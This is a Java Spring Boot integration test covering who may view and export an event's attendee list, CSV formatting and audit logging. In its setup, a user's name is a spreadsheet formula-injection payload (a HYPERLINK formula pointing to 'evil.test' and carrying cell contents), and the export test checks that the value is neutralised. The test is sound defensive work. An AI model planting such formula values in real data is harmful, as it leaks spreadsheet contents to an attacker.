package club.asbl.asbl_club.payment;

import static org.assertj.core.api.Assertions.assertThat;
import static org.hamcrest.Matchers.hasItem;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import club.asbl.asbl_club.TestcontainersConfiguration;
import club.asbl.asbl_club.asbl.Asbl;
import club.asbl.asbl_club.asbl.AsblService;
import club.asbl.asbl_club.event.Event;
import club.asbl.asbl_club.event.EventService;
import club.asbl.asbl_club.user.User;
import club.asbl.asbl_club.user.UserService;
import com.jayway.jsonpath.JsonPath;
import jakarta.persistence.EntityManager;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.context.annotation.Import;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;
import org.springframework.transaction.annotation.Transactional;

// Who booked an event: administrators and treasurers see it and can download it; nobody else.
@SpringBootTest(properties = "spring.docker.compose.enabled=false")
@AutoConfigureMockMvc
@Import(TestcontainersConfiguration.class)
@Transactional
class AttendeesIntegrationTest {

    private static final String ATTENDEES = "/api/v1/asbls/mon-club/manage/events/%d/attendees";

    @Autowired
    MockMvc mockMvc;
    @Autowired
    UserService userService;
    @Autowired
    AsblService asblService;
    @Autowired
    EventService eventService;
    @Autowired
    ReservationService reservationService;
    @Autowired
    JdbcTemplate jdbcTemplate;
    @Autowired
    EntityManager entityManager;

    Asbl club;
    Event concert;
    Long standard;
    User alice;
    User mallory;

    @BeforeEach
    void aConcertWithTwoBookings() {
        alice = userService.register("Alice Admin", "alice@club.test", "password123");
        club = asblService.createAsbl(alice, "Mon Club", "0123.456.789", "mon-club", "fr");
        concert = eventService.createEvent(club, "Concert", null, Instant.parse("2026-12-01T19:00:00Z"), null, "PUBLIC");
        eventService.addTicketCategory(concert, "Standard", new BigDecimal("12.50"), 10);
        standard = eventService.ticketCategoriesOf(concert).get(0).id();
        eventService.publish(concert);
        // A member who chose a name meant to run as a formula in an administrator's spreadsheet.
        mallory = member("=HYPERLINK(\"https://evil.test?\"&A1;\"Click\")", "mallory@club.test", "MEMBER");
        member("Trevor Treasurer", "trevor@club.test", "TREASURER");
        member("Mia Member", "mia@club.test", "MEMBER");
        Registration paid = reservationService.reserve(concert, standard, alice);
        reservationService.reserve(concert, standard, mallory);
        entityManager.flush();
        jdbcTemplate.update("UPDATE registrations SET status = 'PAID' WHERE id = ?", paid.getId());
        entityManager.clear(); // as a new request would: nothing cached from the setup
    }

    @Test
    void anAdministrator_seesEveryBooking_withItsStatus() throws Exception {
        call(get(ATTENDEES.formatted(concert.getId())), "alice@club.test")
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.eventTitle").value("Concert"))
                .andExpect(jsonPath("$.attendees.length()").value(2))
                .andExpect(jsonPath("$.attendees[0].name").value("Alice Admin"))
                .andExpect(jsonPath("$.attendees[0].email").value("alice@club.test"))
                .andExpect(jsonPath("$.attendees[0].ticket").value("Standard"))
                .andExpect(jsonPath("$.attendees[0].status").value("PAID"))
                .andExpect(jsonPath("$.attendees[0].amount").value(12.50))
                .andExpect(jsonPath("$.attendees[*].status").value(hasItem("RESERVED")));
    }

    @Test
    void aTreasurer_seesThemToo_andTheEventPageSaysSo() throws Exception {
        call(get(ATTENDEES.formatted(concert.getId())), "trevor@club.test").andExpect(status().isOk());
        call(get("/api/v1/asbls/mon-club/manage/events/" + concert.getId()), "trevor@club.test")
                .andExpect(jsonPath("$.canManage").value(false))
                .andExpect(jsonPath("$.canSeeAttendees").value(true));
    }

    @Test
    void aPlainMember_isRefused_andTheEventPageSaysSo() throws Exception {
        call(get(ATTENDEES.formatted(concert.getId())), "mia@club.test").andExpect(status().isForbidden());
        call(get(ATTENDEES.formatted(concert.getId()) + "/export"), "mia@club.test").andExpect(status().isForbidden());
        call(get("/api/v1/asbls/mon-club/manage/events/" + concert.getId()), "mia@club.test")
                .andExpect(jsonPath("$.canSeeAttendees").value(false));
    }

    @Test
    void outsiders_areRefused_andAnotherAssociationsEvent_isNotFound() throws Exception {
        userService.register("Olga Outsider", "olga@club.test", "password123");
        call(get(ATTENDEES.formatted(concert.getId())), "olga@club.test").andExpect(status().isForbidden());
        mockMvc.perform(get(ATTENDEES.formatted(concert.getId()))).andExpect(status().isUnauthorized());

        User other = userService.register("Other", "other@club.test", "password123");
        Asbl otherClub = asblService.createAsbl(other, "Other Club", "0987.654.321", "other-club", "fr");
        Event foreign = eventService.createEvent(otherClub, "Theirs", null, Instant.parse("2026-12-02T19:00:00Z"),
                null, "PUBLIC");
        call(get(ATTENDEES.formatted(foreign.getId())), "alice@club.test").andExpect(status().isNotFound());
    }

    @Test
    void theCsv_isReadyForExcel_inTheReadersLanguage_andNeutralisesFormulas() throws Exception {
        byte[] body = call(get(ATTENDEES.formatted(concert.getId()) + "/export")
                        .accept("text/csv").header("Accept-Language", "fr"), "alice@club.test")
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Type", "text/csv;charset=UTF-8"))
                .andExpect(header().string("Content-Disposition",
                        "attachment; filename=\"attendees-mon-club-" + concert.getId() + ".csv\""))
                .andExpect(header().string("Cache-Control", "no-store"))
                .andReturn().getResponse().getContentAsByteArray();
        String csv = new String(body, StandardCharsets.UTF_8);

        assertThat(csv).startsWith("﻿Nom;E-mail;Billet;Statut;Montant (EUR);Réservé le\r\n");
        assertThat(csv).contains("Alice Admin;alice@club.test;Standard;Payé;12,50;");
        // The formula arrives as text: a leading apostrophe, and quoted because it contains ; and ".
        assertThat(csv).contains("\"'=HYPERLINK(\"\"https://evil.test?\"\"&A1;\"\"Click\"\")\";mallory@club.test");
        assertThat(csv).contains("En attente de paiement");
    }

    @Test
    void bookings_andExports_areAudited_withWhoDidIt() throws Exception {
        call(get(ATTENDEES.formatted(concert.getId()) + "/export"), "alice@club.test").andExpect(status().isOk());

        entityManager.flush();
        assertThat(jdbcTemplate.queryForObject("SELECT count(*) FROM audit_logs a JOIN users u ON u.id = a.user_id "
                + "WHERE a.action = 'BOOKING_CREATED' AND a.asbl_id = ?", Integer.class, club.getId())).isEqualTo(2);
        assertThat(jdbcTemplate.queryForObject("SELECT u.email FROM audit_logs a JOIN users u ON u.id = a.user_id "
                + "WHERE a.action = 'ATTENDEES_EXPORTED' AND a.asbl_id = ?", String.class, club.getId()))
                .isEqualTo("alice@club.test");
    }

    private User member(String name, String email, String role) {
        User user = userService.register(name, email, "password123");
        jdbcTemplate.update("INSERT INTO memberships (user_id, asbl_id, role, status) VALUES (?, ?, ?, 'ACTIVE')",
                user.getId(), club.getId(), role);
        return user;
    }

    private ResultActions call(MockHttpServletRequestBuilder request, String email) throws Exception {
        return mockMvc.perform(request.header("Authorization", "Bearer " + tokenFor(email)));
    }

    private String tokenFor(String email) throws Exception {
        String body = mockMvc.perform(post("/api/v1/auth/login")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"email\": \"%s\", \"password\": \"password123\"}".formatted(email)))
                .andReturn().getResponse().getContentAsString();
        return JsonPath.read(body, "$.accessToken");
    }
}
